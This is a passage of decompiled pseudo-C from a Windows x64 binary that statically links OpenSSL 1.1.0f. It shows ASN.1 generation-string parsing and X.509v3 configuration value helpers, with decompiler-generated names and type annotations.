  if ( !a1 )
    return 0xFFFFFFFFi64;
  v8 = 0;
  v9 = a1;
  if ( a2 > 0 )
  {
    while ( *v9 != 58 )
    {
      ++v9;
      if ( ++v8 >= a2 )
        goto LABEL_7;
    }
    v7 = v9 + 1;
    v6 = a2 + (_DWORD)a1 - ((_DWORD)v9 + 1);
    v4 = (_DWORD)v9 - (_DWORD)a1;
  }
LABEL_7:
  v10 = sub_1400B76D0(a1, v4);
  if ( v10 == -1 )
  {
    sub_140024610(13, 177, 194, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 266);
    sub_140023A40(2, "tag=", a1);
    return 0xFFFFFFFFi64;
  }
  if ( (v10 & 0x10000) != 0 )
  {
    switch ( v10 )
    {
      case 65537:
        if ( *(_DWORD *)a3 == -1 )
        {
          if ( (unsigned int)sub_1400B80B0(v7, v6, (signed int *)a3, (_DWORD *)(a3 + 4)) )
            return 1i64;
          return 0xFFFFFFFFi64;
        }
        else
        {
          sub_140024610(13, 177, 181, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 288);
          return 0xFFFFFFFFi64;
        }
      case 65538:
        if ( !(unsigned int)sub_1400B80B0(v7, v6, &v18, &v17) )
          return 0xFFFFFFFFi64;
        v12 = v17;
        v13 = v18;
        v16 = 0;
        goto LABEL_22;
      case 65540:
        v15 = sub_1400B7140((int *)a3, 3, 0, 0, 1, 1);
        goto LABEL_24;
      case 65541:
        v14 = 0;
        v16 = 1;
        v12 = 0;
        v13 = 4;
        goto LABEL_23;
      case 65542:
        v12 = 0;
        v16 = 1;
        v13 = 16;
        goto LABEL_22;
      case 65543:
        v12 = 0;
        v16 = 1;
        v13 = 17;
LABEL_22:
        v14 = 1;
LABEL_23:
        v15 = sub_1400B7140((int *)a3, v13, v12, v14, 0, v16);
LABEL_24:
        if ( v15 )
          return 1i64;
        return 0xFFFFFFFFi64;
      case 65544:
        if ( !v7 )
        {
          sub_140024610(13, 177, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 325);
          return 0xFFFFFFFFi64;
        }
        if ( !strncmp(v7, "ASCII", 5ui64) )
        {
          *(_DWORD *)(a3 + 12) = 1;
        }
        else if ( !strncmp(v7, "UTF8", 4ui64) )
        {
          *(_DWORD *)(a3 + 12) = 2;
        }
        else if ( !strncmp(v7, "HEX", 3ui64) )
        {
          *(_DWORD *)(a3 + 12) = 3;
        }
        else
        {
          if ( strncmp(v7, "BITLIST", 7ui64) )
          {
            sub_140024610(13, 177, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 337);
            return 0xFFFFFFFFi64;
          }
          *(_DWORD *)(a3 + 12) = 4;
        }
        return 1i64;
      default:
        return 1i64;
    }
  }
  *(_DWORD *)(a3 + 8) = v10;
  *(_QWORD *)(a3 + 16) = v7;
  if ( v7 || !a1[v4] )
    return 0i64;
  sub_140024610(13, 177, 189, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 277);
  return 0xFFFFFFFFi64;
}

//----- (00000001400B7560) ----------------------------------------------------
__int64 __fastcall sub_1400B7560(int a1, __int64 a2, __int64 a3, int a4, __int64 a5)
{
  unsigned __int8 *v5; // rbp
  __int64 v7; // r14
  unsigned int *v8; // rdi
  int *v12; // rsi
  unsigned int *v13; // rax
  int v14; // ebx
  __int64 v15; // rax
  __int64 v16; // rax
  int v17; // eax
  int v18; // ebx
  unsigned __int8 **v19; // rax
  unsigned __int8 *v21[7]; // [rsp+20h] [rbp-38h] BYREF

  v5 = 0i64;
  v7 = 0i64;
  v21[0] = 0i64;
  v8 = 0i64;
  v12 = (int *)sub_1400296C0();
  if ( !v12 )
    goto LABEL_16;
  if ( !a2 )
    goto LABEL_9;
  if ( !a3 || (v13 = (unsigned int *)sub_1400BB7F0(a3), (v8 = v13) == 0i64) )
  {
LABEL_16:
    v5 = v21[0];
    goto LABEL_17;
  }
  v14 = 0;
  if ( (int)sub_1400296E0(v13) > 0 )
  {
    do
    {
      v15 = sub_140029880((__int64)v8, v14);
      v16 = sub_1400B7D00(*(_QWORD *)(v15 + 16), a3, (unsigned int)(a4 + 1), a5);
      if ( !v16 || !(unsigned int)sub_1400297C0(v12, v16) )
        goto LABEL_16;
    }
    while ( ++v14 < (int)sub_1400296E0(v8) );
  }
LABEL_9:
  if ( a1 == 17 )
    v17 = sub_1400500B0((unsigned int *)v12, v21);
  else
    v17 = sub_140050090((unsigned int *)v12, v21);
  v18 = v17;
  if ( v17 < 0 )
    goto LABEL_16;
  v7 = sub_14004FF40();
  if ( !v7 )
    goto LABEL_16;
  v19 = (unsigned __int8 **)sub_140047720(a1);
  *(_QWORD *)(v7 + 8) = v19;
  if ( !v19 )
    goto LABEL_16;
  *(_DWORD *)v7 = a1;
  v19[1] = v21[0];
  **(_DWORD **)(v7 + 8) = v18;
  v21[0] = 0i64;
LABEL_17:
  sub_14001D930(v5);
  sub_140029720(v12, (void (*)(void))sub_14004FF20);
  sub_1400BB850(a3, (__int64)v8);
  return v7;
}
// 1400B7D00: using guessed type __int64 __fastcall sub_1400B7D00(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (00000001400B76D0) ----------------------------------------------------
__int64 __fastcall sub_1400B76D0(const char *a1, int a2)
{
  unsigned int v2; // edi
  int v3; // ebx
  unsigned int v5; // ebx
  const char *i; // rax
  char **v7; // rax
  bool v8; // zf

  v2 = 0;
  v3 = a2;
  if ( a2 == -1 )
  {
    v5 = 0;
    for ( i = a1; *i; ++v5 )
    {
      if ( v5 >= 0x80000000 )
        break;
      ++i;
    }
    v3 = v5 & 0x7FFFFFFF;
  }
  v7 = &off_140121BB0;
  qword_140143490 = (__int64)&off_140121BB0;
  while ( 1 )
  {
    if ( v3 == *((_DWORD *)v7 + 2) )
    {
      v8 = strncmp(*v7, a1, v3) == 0;
      v7 = (char **)qword_140143490;
      if ( v8 )
        break;
    }
    v7 += 2;
    ++v2;
    qword_140143490 = (__int64)v7;
    if ( v2 >= 0x31 )
      return 0xFFFFFFFFi64;
  }
  return *(unsigned int *)(qword_140143490 + 12);
}
// 140121BB0: using guessed type char *off_140121BB0;
// 140143490: using guessed type __int64 qword_140143490;

//----- (00000001400B7780) ----------------------------------------------------
unsigned int *__fastcall sub_1400B7780(char *a1, int a2, unsigned int a3)
{
  unsigned int *v6; // rbx
  char *v8; // rsi
  _DWORD *v9; // rax
  char **v10; // rax
  _DWORD *v11; // rax
  int v12; // edi
  int v13; // eax
  _DWORD *v14; // rax
  void *v15; // rax
  __int64 v16[7]; // [rsp+30h] [rbp-38h] BYREF
  int v17; // [rsp+88h] [rbp+20h] BYREF

  v6 = (unsigned int *)sub_14004FF40();
  if ( !v6 )
  {
    sub_140024610(13, 179, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 587);
    return 0i64;
  }
  v8 = byte_1400D7DAE;
  if ( a1 )
    v8 = a1;
  switch ( a3 )
  {
    case 1u:
      if ( a2 != 1 )
      {
        sub_140024610(13, 179, 190, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 605);
        goto LABEL_54;
      }
      v16[2] = (__int64)v8;
      v16[1] = 0i64;
      v16[0] = 0i64;
      if ( (unsigned int)sub_1400B8590(v16, v6 + 2) )
        goto LABEL_46;
      sub_140024610(13, 179, 176, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 612);
      goto LABEL_53;
    case 2u:
    case 0xAu:
      if ( a2 != 1 )
      {
        sub_140024610(13, 179, 185, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 620);
        goto LABEL_54;
      }
      v9 = sub_1400B92B0(0i64, v8);
      *((_QWORD *)v6 + 1) = v9;
      if ( v9 )
        goto LABEL_46;
      sub_140024610(13, 179, 180, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 625);
      goto LABEL_53;
    case 3u:
    case 4u:
      v14 = sub_140047570();
      *((_QWORD *)v6 + 1) = v14;
      if ( !v14 )
      {
        sub_140024610(13, 179, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 692);
        goto LABEL_54;
      }
      if ( a2 == 3 )
      {
        v15 = sub_14003BE60(v8, &v17);
        if ( !v15 )
        {
          sub_140024610(13, 179, 178, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 698);
          goto LABEL_53;
        }
        *(_QWORD *)(*((_QWORD *)v6 + 1) + 8i64) = v15;
        **((_DWORD **)v6 + 1) = v17;
        *(_DWORD *)(*((_QWORD *)v6 + 1) + 4i64) = a3;
        goto LABEL_44;
      }
      if ( a2 == 1 )
      {
        sub_1400475D0((__int64)v14, v8, -1);
LABEL_44:
        if ( a3 == 3 )
        {
          *(_DWORD *)(*((_QWORD *)v6 + 1) + 16i64) &= 0xFFFFFFF0;
          *(_DWORD *)(*((_QWORD *)v6 + 1) + 16i64) |= 8u;
        }
        goto LABEL_46;
      }
      if ( a2 != 4 || a3 != 3 )
      {
        sub_140024610(13, 179, 175, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 716);
        goto LABEL_54;
      }
      if ( (unsigned int)sub_14002EEA0(
                           v8,
                           44,
                           1,
                           (__int64 (__fastcall *)(const char *, __int64, __int64))sub_1400B7C20,
                           (__int64)v14) )
        goto LABEL_46;
      sub_140024610(13, 179, 188, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 710);
LABEL_53:
      sub_140023A40(2, "string=", v8);
LABEL_54:
      sub_14004FF20(v6);
      return 0i64;
    case 5u:
      if ( !v8 || !*v8 )
        goto LABEL_46;
      sub_140024610(13, 179, 182, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 598);
      goto LABEL_54;
    case 6u:
      if ( a2 != 1 )
      {
        sub_140024610(13, 179, 191, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 632);
        goto LABEL_54;
      }
      v10 = sub_14002C840(v8, 0);
      *((_QWORD *)v6 + 1) = v10;
      if ( v10 )
        goto LABEL_46;
      sub_140024610(13, 179, 183, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 636);
      goto LABEL_53;
    case 0xCu:
    case 0x12u:
    case 0x13u:
    case 0x14u:
    case 0x16u:
    case 0x1Au:
    case 0x1Bu:
    case 0x1Cu:
    case 0x1Eu:
      if ( a2 == 1 )
      {
        v12 = 4097;
      }
      else
      {
        if ( a2 != 2 )
        {
          sub_140024610(13, 179, 177, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 677);
          goto LABEL_54;
        }
        v12 = 4096;
      }
      v13 = sub_1400517D0(a3);
      if ( (int)sub_1400AB060((_DWORD **)v6 + 1, v8, -1, v12, v13) > 0 )
        goto LABEL_46;
      sub_140024610(13, 179, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 683);
      goto LABEL_53;
    case 0x17u:
    case 0x18u:
      if ( a2 != 1 )
      {
        sub_140024610(13, 179, 193, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 644);
        goto LABEL_54;
      }
      v11 = sub_140047570();
      *((_QWORD *)v6 + 1) = v11;
      if ( !v11 )
      {
        sub_140024610(13, 179, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 648);
        goto LABEL_53;
      }
      if ( !(unsigned int)sub_1400475D0((__int64)v11, v8, -1) )
      {
        sub_140024610(13, 179, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 652);
        goto LABEL_53;
      }
      *(_DWORD *)(*((_QWORD *)v6 + 1) + 4i64) = a3;
      if ( !(unsigned int)sub_1400AC1C0(*((int **)v6 + 1)) )
      {
        sub_140024610(13, 179, 184, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 657);
        goto LABEL_53;
      }
LABEL_46:
      *v6 = a3;
      return v6;
    default:
      sub_140024610(13, 179, 196, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 729);
      goto LABEL_53;
  }
}

//----- (00000001400B7C20) ----------------------------------------------------
__int64 __fastcall sub_1400B7C20(const char *a1, int a2, int *a3)
{
  int v3; // eax
  __int64 v4; // rdi
  int v7; // eax
  char *EndPtr; // [rsp+40h] [rbp+8h] BYREF

  v4 = a2;
  if ( !a1 )
    return 0i64;
  v7 = strtoul(a1, &EndPtr, v3 - 38);
  if ( EndPtr )
  {
    if ( *EndPtr && EndPtr != &a1[v4] )
      return 0i64;
  }
  if ( v7 < 0 )
  {
    sub_140024610(13, 180, 187, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 755);
    return 0i64;
  }
  if ( (unsigned int)sub_140082780(a3, v7, 1) )
    return 1i64;
  sub_140024610(13, 180, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 759);
  return 0i64;
}
// 1400B7C46: variable 'v3' is possibly undefined

//----- (00000001400B7D00) ----------------------------------------------------
unsigned int *__fastcall sub_1400B7D00(const char *a1, __int64 a2, int a3, _DWORD *a4)
{
  __int64 v4; // rsi
  void *v8; // r14
  int v9; // r15d
  unsigned int *result; // rax
  unsigned int *v11; // rbx
  int v12; // r12d
  char v13; // r15
  unsigned int v14; // edi
  int *v15; // rbx
  int v16; // r8d
  int v17; // edx
  void *v18; // rax
  int *v19; // rbx
  int v20; // [rsp+30h] [rbp-D0h] BYREF
  void *v21; // [rsp+38h] [rbp-C8h] BYREF
  unsigned __int8 *v22; // [rsp+40h] [rbp-C0h] BYREF
  void *Src; // [rsp+48h] [rbp-B8h] BYREF
  int v24; // [rsp+50h] [rbp-B0h] BYREF
  int v25; // [rsp+54h] [rbp-ACh] BYREF
  char *v26; // [rsp+58h] [rbp-A8h] BYREF
  __int64 v27; // [rsp+60h] [rbp-A0h] BYREF
  unsigned int v28; // [rsp+68h] [rbp-98h]
  int v29; // [rsp+6Ch] [rbp-94h]
  char *v30; // [rsp+70h] [rbp-90h]
  char v31; // [rsp+88h] [rbp-78h] BYREF
  int v32; // [rsp+208h] [rbp+108h]

  v4 = 0i64;
  v27 = -1i64;
  v22 = 0i64;
  v20 = 0;
  v29 = 1;
  v32 = 0;
  v8 = 0i64;
  v9 = 0;
  if ( (unsigned int)sub_14002EEA0(
                       a1,
                       44,
                       1,
                       (__int64 (__fastcall *)(const char *, __int64, __int64))sub_1400B7210,
                       (__int64)&v27) )
  {
    *a4 = 194;
    return 0i64;
  }
  if ( v28 - 16 <= 1 )
  {
    if ( !a2 )
    {
      *a4 = 192;
      return 0i64;
    }
    if ( a3 >= 50 )
    {
      *a4 = 181;
      return 0i64;
    }
    result = (unsigned int *)sub_1400B7560(v28, (__int64)v30, a2, a3, (__int64)a4);
  }
  else
  {
    result = sub_1400B7780(v30, v29, v28);
  }
  v11 = result;
  if ( !result )
    return 0i64;
  if ( (_DWORD)v27 != -1 || v32 )
  {
    v12 = sub_1400500D0(result, &v22);
    sub_14004FF20(v11);
    Src = v22;
    if ( (_DWORD)v27 == -1 )
    {
      v14 = v12;
    }
    else
    {
      v13 = sub_140047780((_BYTE **)&Src, &v20, &v25, &v24, v12);
      if ( v13 < 0 )
      {
LABEL_34:
        sub_14001D930(v22);
        sub_14001D930(v8);
        return (unsigned int *)v4;
      }
      v12 += (_DWORD)v22 - (_DWORD)Src;
      if ( (v13 & 1) != 0 )
      {
        v20 = 0;
        v9 = 2;
        v14 = sub_140047960(0, 0, v27);
      }
      else
      {
        v9 = v13 & 0x20;
        v14 = sub_140047960(0, v20, v27);
      }
    }
    v15 = (int *)&v27 + 5 * v32 + 1;
    if ( v32 > 0 )
    {
      do
      {
        v16 = *v15;
        v17 = v15[3] + v14;
        v15[4] = v17;
        LODWORD(v8) = (_DWORD)v8 + 1;
        v15 -= 5;
        v14 = sub_140047960(0, v17, v16);
      }
      while ( (int)v8 < v32 );
    }
    v18 = sub_14001D8E0((int)v14);
    v8 = v18;
    if ( v18 )
    {
      v21 = v18;
      if ( v32 > 0 )
      {
        v19 = (int *)&v31;
        do
        {
          sub_1400479D0((_BYTE **)&v21, *(v19 - 2), *v19, *(v19 - 4), *(v19 - 3));
          if ( *(v19 - 1) )
          {
            *(_BYTE *)v21 = 0;
            v21 = (char *)v21 + 1;
          }
          LODWORD(v4) = v4 + 1;
          v19 += 5;
        }
        while ( (int)v4 < v32 );
      }
      if ( (_DWORD)v27 != -1 )
      {
        if ( !HIDWORD(v27) && (unsigned int)(v27 - 16) <= 1 )
          v9 = 32;
        sub_1400479D0((_BYTE **)&v21, v9, v20, v27, SBYTE4(v27));
      }
      memmove(v21, Src, v12);
      v26 = (char *)v8;
      v4 = sub_140050030(0i64, &v26, v14);
    }
    goto LABEL_34;
  }
  return result;
}

//----- (00000001400B8010) ----------------------------------------------------
__int64 __fastcall sub_1400B8010(const char *a1, int a2, _DWORD *a3)
{
  unsigned int v7; // eax
  int v8; // eax

  if ( !a1 )
    return 0i64;
  if ( a2 == 3 && !strncmp(a1, "DIR", 3ui64) )
  {
    *a3 |= 0x2906u;
    return (unsigned int)(a2 - 2);
  }
  v7 = sub_1400B76D0(a1, a2);
  if ( !v7 )
    return 0i64;
  if ( (v7 & 0x10000) != 0 )
    return 0i64;
  v8 = sub_1400517D0(v7);
  if ( !v8 )
    return 0i64;
  *a3 |= v8;
  return 1i64;
}

//----- (00000001400B80B0) ----------------------------------------------------
__int64 __fastcall sub_1400B80B0(const char *a1, int a2, signed int *a3, _DWORD *a4)
{
  int v4; // eax
  __int64 v5; // rsi
  signed int v9; // eax
  char *v10; // rdx
  char v12; // al
  char *EndPtr; // [rsp+30h] [rbp-18h] BYREF
  char v14; // [rsp+50h] [rbp+8h] BYREF
  char v15; // [rsp+51h] [rbp+9h]

  v5 = a2;
  if ( !a1 )
    return 0i64;
  v9 = strtoul(a1, &EndPtr, v4 - 54);
  v10 = EndPtr;
  if ( EndPtr )
  {
    if ( *EndPtr && EndPtr > &a1[v5] )
      return 0i64;
  }
  if ( v9 < 0 )
  {
    sub_140024610(13, 182, 187, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 360);
    return 0i64;
  }
  *a3 = v9;
  if ( !v10 || !((_DWORD)a1 - (_DWORD)v10 + (_DWORD)v5) )
    goto LABEL_18;
  v12 = *v10;
  if ( *v10 == 65 )
  {
    *a4 = 64;
    return 1i64;
  }
  switch ( v12 )
  {
    case 'C':
LABEL_18:
      *a4 = 128;
      return 1i64;
    case 'P':
      *a4 = 192;
      break;
    case 'U':
      *a4 = 0;
      break;
    default:
      v14 = *v10;
      v15 = 0;
      sub_140024610(13, 182, 186, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_gen.c", 391);
      sub_140023A40(2, "Char=", &v14);
      return 0i64;
  }
  return 1i64;
}
// 1400B80DF: variable 'v4' is possibly undefined

//----- (00000001400B81E0) ----------------------------------------------------
__int64 __fastcall sub_1400B81E0(__int64 a1, unsigned int *a2, int a3)
{
  int v7; // ebx
  __int64 v8; // r14
  __int64 v9; // r9
  char *v10; // r10
  char *v11; // r8
  unsigned __int64 v12; // rcx
  char *v13; // r8
  int v14; // eax

  if ( !a1 )
    return 0i64;
  v7 = 0;
  if ( (int)sub_1400296E0(a2) <= 0 )
    return 1i64;
  v8 = 0x400500000000000i64;
  while ( 1 )
  {
    v9 = sub_140029880((__int64)a2, v7);
    v10 = *(char **)(v9 + 8);
    v11 = v10;
    v12 = (unsigned __int8)*v10;
    if ( (_BYTE)v12 )
    {
      while ( (unsigned __int8)v12 > 0x3Au || !_bittest64(&v8, v12) )
      {
        v12 = (unsigned __int8)*++v11;
        if ( !(_BYTE)v12 )
          goto LABEL_12;
      }
      v13 = v11 + 1;
      if ( *v13 )
        v10 = v13;
    }
LABEL_12:
    if ( *v10 == 43 )
    {
      v14 = -1;
      ++v10;
    }
    else
    {
      v14 = 0;
    }
    if ( !(unsigned int)sub_1400ABCC0(a1, v10, a3, *(char **)(v9 + 16), -1, -1, v14) )
      return 0i64;
    if ( ++v7 >= (int)sub_1400296E0(a2) )
      return 1i64;
  }
}

//----- (00000001400B8300) ----------------------------------------------------
__int64 __fastcall sub_1400B8300(_BYTE *a1, _BYTE *a2, int **a3)
{
  _QWORD *v3; // rbx
  void *v4; // rbp
  void *v5; // rsi
  int *v8; // rax

  v3 = 0i64;
  v4 = 0i64;
  v5 = 0i64;
  if ( (!a1 || (v4 = sub_14003BB60(a1)) != 0i64) && (!a2 || (v5 = sub_14003BB60(a2)) != 0i64) )
  {
    v3 = sub_14001D8E0(0x18ui64);
    if ( v3 )
    {
      if ( *a3 || (v8 = (int *)sub_1400296C0(), (*a3 = v8) != 0i64) )
      {
        *v3 = 0i64;
        v3[1] = v4;
        v3[2] = v5;
        if ( (unsigned int)sub_1400297C0(*a3, (__int64)v3) )
          return 1i64;
      }
    }
  }
  sub_140024610(34, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 56);
  sub_14001D930(v3);
  sub_14001D930(v4);
  sub_14001D930(v5);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400B8440) ----------------------------------------------------
__int64 __fastcall sub_1400B8440(_BYTE *a1, int a2, int **a3)
{
  bool v3; // zf
  char *v4; // rdx

  v3 = a2 == 0;
  v4 = "TRUE";
  if ( v3 )
    v4 = "FALSE";
  return sub_1400B8300(a1, v4, a3);
}

//----- (00000001400B8470) ----------------------------------------------------
__int64 __fastcall sub_1400B8470(_BYTE *a1, __int64 a2, int **a3)
{
  __int64 result; // rax
  void *v6; // rdi
  unsigned int v7; // ebx

  if ( !a2 )
    return 1i64;
  result = (__int64)sub_1400B8E70(0i64, a2);
  v6 = (void *)result;
  if ( result )
  {
    v7 = sub_1400B8300(a1, (_BYTE *)result, a3);
    sub_14001D930(v6);
    return v7;
  }
  return result;
}

//----- (00000001400B8500) ----------------------------------------------------
__int64 __fastcall sub_1400B8500(_BYTE *a1, _BYTE *a2, int **a3)
{
  return sub_1400B8300(a1, a2, a3);
}

//----- (00000001400B8520) ----------------------------------------------------
void __fastcall sub_1400B8520(void **a1)
{
  if ( a1 )
  {
    sub_14001D930(a1[1]);
    sub_14001D930(a1[2]);
    sub_14001D930(*a1);
    sub_14001D930(a1);
  }
}

//----- (00000001400B8590) ----------------------------------------------------
__int64 __fastcall sub_1400B8590(_QWORD *a1, _DWORD *a2)
{
  _BYTE *v2; // r8
  __int64 v4; // r9
  char v5; // al
  __int64 v7; // rcx
  char v8; // al
  __int64 v9; // rcx
  char v10; // al
  __int64 v11; // rcx
  char v12; // al
  __int64 v13; // rcx
  char v14; // al
  __int64 v15; // rcx
  char v16; // al

  v2 = (_BYTE *)a1[2];
  if ( !v2 )
    goto LABEL_41;
  v4 = 0i64;
  while ( 1 )
  {
    v5 = v2[v4++];
    if ( v5 != aTrue[v4 - 1] )
      break;
    if ( v4 == 5 )
    {
      *a2 = 255;
      return 1i64;
    }
  }
  v7 = 0i64;
  while ( 1 )
  {
    v8 = v2[v7++];
    if ( v8 != aTrue_0[v7 - 1] )
      break;
    if ( v7 == 5 )
    {
      *a2 = 255;
      return 1i64;
    }
  }
  if ( *v2 == 89 && !v2[1] || *v2 == 121 && !v2[1] )
  {
LABEL_21:
    *a2 = 255;
    return 1i64;
  }
  v9 = 0i64;
  while ( 1 )
  {
    v10 = v2[v9++];
    if ( v10 != byte_14012207C[v9 - 1] )
      break;
    if ( v9 == 4 )
    {
      *a2 = 255;
      return 1i64;
    }
  }
  v11 = 0i64;
  while ( 1 )
  {
    v12 = v2[v11++];
    if ( v12 != byte_140122080[v11 - 1] )
      break;
    if ( v11 == 4 )
      goto LABEL_21;
  }
  v13 = 0i64;
  while ( 1 )
  {
    v14 = v2[v13++];
    if ( v14 != aFalse[v13 - 1] )
      break;
    if ( v13 == 6 )
    {
      *a2 = 0;
      return 1i64;
    }
  }
  v15 = 0i64;
  while ( 1 )
  {
    v16 = v2[v15++];
    if ( v16 != aFalse_0[v15 - 1] )
      break;
    if ( v15 == 6 )
    {
      *a2 = 0;
      return 1i64;
    }
  }
  if ( *v2 == 78 && !v2[1]
    || *v2 == 110 && !v2[1]
    || *v2 == 78 && v2[1] == 79 && !v2[2]
    || *v2 == 110 && v2[1] == 111 && !v2[2] )
  {
    *a2 = 0;
    return 1i64;
  }
  else
  {
LABEL_41:
    sub_140024610(34, 110, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 219);
    sub_140023A40(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 14012207C: using guessed type _BYTE byte_14012207C[4];
// 140122080: using guessed type _BYTE byte_140122080[4];

//----- (00000001400B8800) ----------------------------------------------------
__int64 __fastcall sub_1400B8800(__int64 a1, _QWORD *a2)
{
  _DWORD *v4; // rax

  v4 = sub_1400B92B0(0i64, *(char **)(a1 + 16));
  if ( v4 )
  {
    *a2 = v4;
    return 1i64;
  }
  else
  {
    sub_140023A40(6, "section:", *(_QWORD *)a1, ",name:", *(_QWORD *)(a1 + 8), ",value:", *(_QWORD *)(a1 + 16));
    return 0i64;
  }
}

//----- (00000001400B8890) ----------------------------------------------------
int *__fastcall sub_1400B8890(_BYTE *a1)
{
  char *v1; // rax
  char *v2; // r14
  char v3; // dl
  unsigned __int8 *v4; // rsi
  int v5; // ebp
  char *v6; // rbx
  unsigned __int8 *v7; // rdi
  unsigned __int8 *v8; // rax
  unsigned __int8 *v9; // rax
  unsigned __int8 *v10; // rax
  unsigned __int8 *v11; // rdx
  unsigned __int8 *v12; // rcx
  unsigned __int8 *v13; // rax
  int *v15; // [rsp+58h] [rbp+10h] BYREF

  v15 = 0i64;
  v1 = (char *)sub_14003BB60(a1);
  v2 = v1;
  if ( !v1 )
  {
    sub_140024610(34, 109, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 253);
LABEL_26:
    sub_14001D930(v2);
    sub_140029720(v15, (void (*)(void))sub_1400B8520);
    return 0i64;
  }
  v3 = *v1;
  v4 = 0i64;
  v5 = 1;
  v6 = v1;
  v7 = (unsigned __int8 *)v1;
  if ( *v1 )
  {
    do
    {
      if ( v3 == 13 || v3 == 10 )
        break;
      if ( v5 == 1 )
      {
        if ( v3 == 58 )
        {
          *v6 = 0;
          v5 = 2;
          v4 = sub_1400B9490(v7);
          if ( !v4 )
          {
            sub_140024610(34, 109, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 270);
            goto LABEL_26;
          }
          v7 = (unsigned __int8 *)(v6 + 1);
        }
        else if ( v3 == 44 )
        {
          *v6 = 0;
          v9 = sub_1400B9490(v7);
          v7 = (unsigned __int8 *)(v6 + 1);
          v4 = v9;
          if ( !v9 )
          {
            sub_140024610(34, 109, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 280);
            goto LABEL_26;
          }
          sub_1400B8300(v9, 0i64, &v15);
        }
      }
      else if ( v3 == 44 )
      {
        *v6 = 0;
        v5 = 1;
        v8 = sub_1400B9490(v7);
        if ( !v8 )
        {
          sub_140024610(34, 109, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 294);
          goto LABEL_26;
        }
        sub_1400B8300(v4, v8, &v15);
        v4 = 0i64;
        v7 = (unsigned __int8 *)(v6 + 1);
      }
      v3 = *++v6;
    }
    while ( v3 );
    if ( v5 != 2 )
      goto LABEL_24;
    v10 = sub_1400B9490(v7);
    if ( !v10 )
    {
      sub_140024610(34, 109, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 309);
      goto LABEL_26;
    }
    v11 = v10;
    v12 = v4;
  }
  else
  {
LABEL_24:
    v13 = sub_1400B9490(v7);
    if ( !v13 )
    {
      sub_140024610(34, 109, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 316);
      goto LABEL_26;
    }
    v11 = 0i64;
    v12 = v13;
  }
  sub_1400B8300(v12, v11, &v15);
  sub_14001D930(v2);
  return v15;
}
// 1400B8916: conditional instruction was optimized away because ebp.4==2
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400B8AA0) ----------------------------------------------------
__int64 __fastcall sub_1400B8AA0(const char *a1)
{
  int v2; // edi
  _DWORD *v3; // rax
  __int64 v4; // rbx
  unsigned int v6; // [rsp+30h] [rbp-38h] BYREF
  unsigned int v7; // [rsp+34h] [rbp-34h] BYREF
  unsigned int v8; // [rsp+38h] [rbp-30h] BYREF
  unsigned int v9; // [rsp+3Ch] [rbp-2Ch] BYREF
  __int128 v10; // [rsp+40h] [rbp-28h] BYREF

  if ( strchr(a1, 58) )
  {
    if ( !(unsigned int)sub_1400B9040(&v10, a1) )
      return 0i64;
    v2 = 16;
  }
  else
  {
